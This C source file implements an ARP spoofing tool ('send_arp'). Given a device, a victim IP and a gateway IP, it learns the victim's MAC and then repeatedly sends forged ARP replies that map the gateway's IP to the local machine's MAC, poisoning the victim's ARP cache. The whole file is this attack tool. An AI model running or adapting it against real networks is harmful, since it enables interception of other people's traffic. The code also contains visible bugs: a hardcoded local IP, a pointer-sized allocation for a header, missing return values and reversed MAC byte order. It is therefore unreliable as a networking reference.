#include "header.h"

int main(int argc, char *argv[])
{
	if (argc != 4)
	{
		printf("wrong!\n[format] sudo ./send_arp <devname> <victim ip> <gateway ip>\n");
		return -1;
	}

	/* init values with arguments */
	char *dev = argv[1];
	const char *vic_ip_char = (const char *)argv[2];
	const char *gate_ip_char = (const char *)argv[3];

	u_int8_t *local_mac = (u_int8_t *)malloc(sizeof(u_int8_t) * MACLEN);
	get_local_mac(dev, local_mac);

	u_int8_t *null_mac = (u_int8_t *)malloc(sizeof(u_int8_t) * MACLEN);
	for (int i = 0; i < MACLEN; i++)
	{
		null_mac[i] = 0xFF;
	}
	u_int32_t vic_ip;
	ipchar_to_uint(vic_ip_char, &vic_ip);
	u_int32_t gate_ip;
	ipchar_to_uint(gate_ip_char, &gate_ip);

	/* pcap handle open */
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL)
	{
		fprintf(stderr, "couldn't open device %s : %s\n", dev, errbuf);
	}

	/* 1. send ARP REQUEST 
	*	make and send [arp request packet]
	*/

	printf("- send ARP REQUEST to victim \n");
	ethernet_hdr *ethernet_h = make_ethernet_header(
		null_mac,										/* ether_dhost */
		local_mac,										/* ether_shost */
		ARP);											/* ether_type */
	arp_hdr *arp_h = make_arp_header(
		ETHERNET,										/* ar_hrd */
		IPV4,											/* ar_pro */
		HWLEN,											/* ar_hln */
		PTLEN,											/* ar_plln */
		REQUEST,										/* ar_op */
		local_mac,										/* ar_src_mac */
		get_local_ip(dev),								/* ar_src_ip */
		null_mac,										/* ar_dst_mac */
		vic_ip);										/* ar_dst_ip */
	hton_ethernet(ethernet_h);
	hton_arp(arp_h);
	print_packet(ethernet_h, arp_h);
	
	/* 2. get ARP REPLY and parse source MAC
	*  3. make [arp request packet]
	*/

	printf("\n\n- receive ARP REPLY from victim ");
	u_int8_t temp_mac[MACLEN] = {0,};

	/* set ethernet_h->ether_shost to received mac address */
	while ( (receive_reply(handle, vic_ip, temp_mac) != 1))
	{
		send_packet(handle, ethernet_h, arp_h, REQUEST);		
	}
	printf("\n\n- make ARP REPLY packet");
	ethernet_hdr *r_ethernet_h = make_ethernet_header(
		temp_mac,										/* ether_dhost */
		local_mac,										/* ether_shost */
		ARP);											/* ether_type */
	arp_hdr *r_arp_h = make_arp_header(
		ETHERNET,										/* ar_hrd */
		IPV4,											/* ar_pro */
		HWLEN,											/* ar_hln */
		PTLEN,											/* ar_plln */
		REPLY,										/* ar_op */
		local_mac,										/* ar_src_mac */
		gate_ip,								/* ar_src_ip */
		temp_mac,										/* ar_dst_mac */
		vic_ip);										/* ar_dst_ip */

	hton_ethernet(r_ethernet_h);
	hton_arp(r_arp_h);
	print_packet(r_ethernet_h, r_arp_h);


	/* 4. receive victim's arp request packet
	*  5. send arp reply packet
	*/
	while ( (receive_request(handle, vic_ip) != 1))
	{
		send_packet(handle, r_ethernet_h, r_arp_h, REPLY);		
	}

	return 0;
}

int get_local_mac(const char *dev, u_int8_t *mac)
{
	struct ifreq ifr;
	int fd;
	int rv; // return value - error value from df or ioctl call

	/* determine the local MAC address */
	strcpy(ifr.ifr_name, dev);
	fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	if (fd < 0)
		rv = fd;
	else
	{
		rv = ioctl(fd, SIOCGIFHWADDR, &ifr);
		if (rv >= 0) /* worked okay */
			memcpy(mac, ifr.ifr_hwaddr.sa_data, IFHWADDRLEN);
	}

	return rv;
}

u_int32_t get_local_ip(const char *dev)
{

	/*
	struct ifreq ifr;
	int fd;
	u_int32_t ip;

	strcpy(ifr.ifr_name, dev);
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd >= 0)
	{
		struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
		ioctl(fd, SIOCGIFHWADDR, &ifr);
		memcpy(&ip, &(ipaddr->sin_addr), 4);

		for(int i = 0 ; i <4; i++){
			printf("%02x ", (ip & (0xff<<(i*8))));
		}
	}

*/

	u_int32_t ip = 0x00000a00020f;

	return ip;
}

void ipchar_to_uint(const char *char_ip, u_int32_t *int_ip)
{
	u_int32_t byte3;
	u_int32_t byte2;
	u_int32_t byte1;
	u_int32_t byte0;
	char dummyString[2];

	if (sscanf(char_ip, "%u.%u.%u.%u%1s",
			   &byte3, &byte2, &byte1, &byte0, dummyString) == 4)
	{
		if ((byte3 < 256) && (byte2 < 256) && (byte1 < 256) && (byte0 < 256))
		{
			*int_ip = (byte3 << 24) + (byte2 << 16) + (byte1 << 8) + byte0;
		}
	}
}

arp_hdr *make_arp_header(u_int16_t ar_hrd, u_int16_t ar_pro, u_int8_t ar_hln, u_int8_t ar_pln, u_int16_t ar_op, u_int8_t *ar_src_mac, u_int32_t ar_src_ip, u_int8_t *ar_dst_mac, u_int32_t ar_dst_ip)
{
	arp_hdr *arp_h = (arp_hdr *)malloc(sizeof(arp_hdr));

	arp_h->ar_hrd = ar_hrd;
	arp_h->ar_pro = ar_pro;
	arp_h->ar_hln = ar_hln;
	arp_h->ar_pln = ar_pln;
	arp_h->ar_op = ar_op;
	for (int i = 0; i < MACLEN; i++)
	{
		arp_h->ar_src_mac[i] = *(ar_src_mac + i);
		arp_h->ar_dst_mac[i] = *(ar_dst_mac + i);
	}
	arp_h->ar_src_ip = ar_src_ip;
	arp_h->ar_dst_ip = ar_dst_ip;
	return arp_h;
}

ethernet_hdr *make_ethernet_header(u_int8_t *ether_dhost, u_int8_t *ether_shost, u_int16_t ether_type)
{
	ethernet_hdr *ethernet_h = (ethernet_hdr *)(malloc(sizeof(ethernet_h)));
	for (int i = 0; i < MACLEN; i++)
	{
		ethernet_h->ether_dhost[i] = *(ether_dhost + i);
		ethernet_h->ether_shost[i] = *(ether_shost + i);
	}
	ethernet_h->ether_type = ether_type;
	return ethernet_h;
}

void hton_ethernet(ethernet_hdr *ethernet_h)
{

	for (int i = 0; i < MACLEN; i++)
	{
		ethernet_h->ether_dhost[i] = *(reverse_array(ethernet_h->ether_dhost) + i);
		ethernet_h->ether_shost[i] = *(reverse_array(ethernet_h->ether_shost) + i);
	}
	ethernet_h->ether_type = htons(ethernet_h->ether_type);
}

void hton_arp(arp_hdr *arp_h)
{

	arp_h->ar_hrd = htons(arp_h->ar_hrd);
	arp_h->ar_pro = htons(arp_h->ar_pro);
	arp_h->ar_hln = arp_h->ar_hln;
	arp_h->ar_pln = arp_h->ar_pln;
	arp_h->ar_op = htons(arp_h->ar_op);
	for (int i = 0; i < MACLEN; i++)
	{
		arp_h->ar_src_mac[i] = *(reverse_array(arp_h->ar_src_mac) + i);
		arp_h->ar_dst_mac[i] = *(reverse_array(arp_h->ar_dst_mac) + i);
	}
	arp_h->ar_src_ip = htonl(arp_h->ar_src_ip);
	arp_h->ar_dst_ip = htonl(arp_h->ar_dst_ip);
}

u_int8_t *reverse_array(u_int8_t *uintarr)
{
	u_int8_t *temp = (u_int8_t *)malloc(sizeof(u_int8_t) * (MACLEN));
	u_int8_t *p = uintarr + (MACLEN - 1);

	for (int i = 0; i < MACLEN; i++)
	{
		*(temp + i) = *(p - i);
	}
	return temp;
}

int receive_reply(pcap_t *handle, u_int32_t ar_src_ip, u_int8_t *ether_shost)
{
	const u_char *packet;
	int rv = -1;

	struct pcap_pkthdr *header;
	int res = pcap_next_ex(handle, &header, &packet);
	ethernet_hdr *ethernet_h = (ethernet_hdr *)malloc(sizeof(ethernet_hdr));
	ethernet_h = (ethernet_hdr *)packet;

	if (ntohs(ethernet_h->ether_type) == ARP)
	{
		arp_hdr *arp_h = (arp_hdr *)malloc(sizeof(arp_hdr));
		arp_h = (arp_hdr *)(packet + sizeof(ethernet_hdr));
		if (ntohs(arp_h->ar_op) == REPLY)
		{
			/* compare ip address */
			if(ntohl(arp_h->ar_src_ip) == ar_src_ip){
				for(int i= 0; i < MACLEN; i++){
					ether_shost[i] = *(reverse_array(arp_h->ar_src_mac) + i);
				}
				//print_packet((ethernet_hdr *)packet, (arp_hdr *)(packet + 14));
				return 1;
			}
		}
	}
}

int receive_request(pcap_t *handle, u_int32_t ar_src_ip)
{
	const u_char *packet;
	int rv = -1;

	struct pcap_pkthdr *header;

	int res = pcap_next_ex(handle, &header, &packet);
	ethernet_hdr *ethernet_h = (ethernet_hdr *)malloc(sizeof(ethernet_hdr));
	ethernet_h = (ethernet_hdr *)packet;

	if (ntohs(ethernet_h->ether_type) == ARP)
	{
		arp_hdr *arp_h = (arp_hdr *)malloc(sizeof(arp_hdr));
		arp_h = (arp_hdr *)(packet + sizeof(ethernet_hdr));
		if (ntohs(arp_h->ar_op) == REQUEST)
		{
			/* compare ip address */
			if(ntohl(arp_h->ar_src_ip) == ar_src_ip){
				return 1;
			}
		}
	}
}

void print_packet(ethernet_hdr *ethernet_h, arp_hdr *arp_h)
{

	/* print ethernet header */
	printf("\n\n[ETHERNET HEADER]\n");
	printf("Destination MAC : ");
	for (int i = 0; i < MACLEN; i++)
	{
		printf("%02x ", *(ethernet_h->ether_dhost + i));
	}
	printf("\nSource MAC : ");
	for (int i = 0; i < MACLEN; i++)
	{
		printf("%02x ", *(ethernet_h->ether_shost + i));
	}
	printf("\nEther Type : ");
	printf("%02x", ethernet_h->ether_type);

	/* print arp header */
	printf("\n[ARP HEADER]\n");
	printf("Hardware type  : %04x\n", arp_h->ar_hrd);
	printf("Protocol  : %04x\n", arp_h->ar_pro);
	printf("ar hln  : %02x\n", arp_h->ar_hln);
	printf("ar pln  : %02x\n", arp_h->ar_pln);
	printf("OP code  : %04x\n", arp_h->ar_op);

	printf("Source MAC : ");
	for (int i = 0; i < MACLEN; i++)
	{
		printf("%02x ", *(arp_h->ar_src_mac + i));
	}
	printf("\nSource IP : ");
	printf("%0x\n", arp_h->ar_src_ip);
	printf("Destination MAC : ");
	for (int i = 0; i < MACLEN; i++)
	{
		printf("%02x ", *(arp_h->ar_dst_mac + i));
	}
	printf("\nDestination IP : ");
	printf("%0x", arp_h->ar_dst_ip);
}

void send_packet(pcap_t *handle, ethernet_hdr *ethernet_h, arp_hdr *arp_h, int mode)
{

	u_char *packet;
	int packet_size;

	switch (mode)
	{
	case REQUEST:
		packet_size = 42;
		break;
	case REPLY:
		packet_size = 60;
		break;
	default:
		break;
	}

	packet = (u_char *)malloc(sizeof(u_char) * packet_size);
	memcpy(packet, ethernet_h, sizeof(ethernet_hdr));
	memcpy(packet + sizeof(ethernet_hdr), arp_h, sizeof(arp_hdr));
	if (pcap_sendpacket(handle, packet, packet_size) != 0)
	{
		fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(handle));
	}
}
